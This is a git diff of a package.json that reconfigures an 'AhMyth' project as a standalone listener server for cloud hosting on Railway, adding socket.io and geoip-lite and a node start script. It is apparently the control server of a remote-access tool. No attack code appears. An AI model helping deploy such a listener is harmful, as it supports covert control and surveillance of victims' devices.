@@ -1,5 +1,15 @@
 {
-    "main": "./app/main.js",
+    "name": "ahmyth-listener",
+    "version": "1.0.0",
+    "description": "AhMyth Standalone Listener Server for Railway",
+    "main": "server.js",
+    "engines": {
+        "node": ">=16.0.0"
+    },
+    "dependencies": {
+        "geoip-lite": "^1.4.10",
+        "socket.io": "^4.6.0"
+    },
     "devDependencies": {
         "electron": "^11.5.0",
         "electron-builder": "^22.11.7",
@@ -15,7 +25,8 @@
         "asarUnpack": "**/app/Factory/**/*"
     },
     "scripts": {
-        "start": "npx electron ./app",
+        "start": "node server.js",
+        "start:electron": "npx electron ./app",
         "clean": "rm -rf ./dist",
         "build": "npm run build:linux && npm run build:win",
         "build:linux": "npm run build:linux32 && npm run build:linux64",
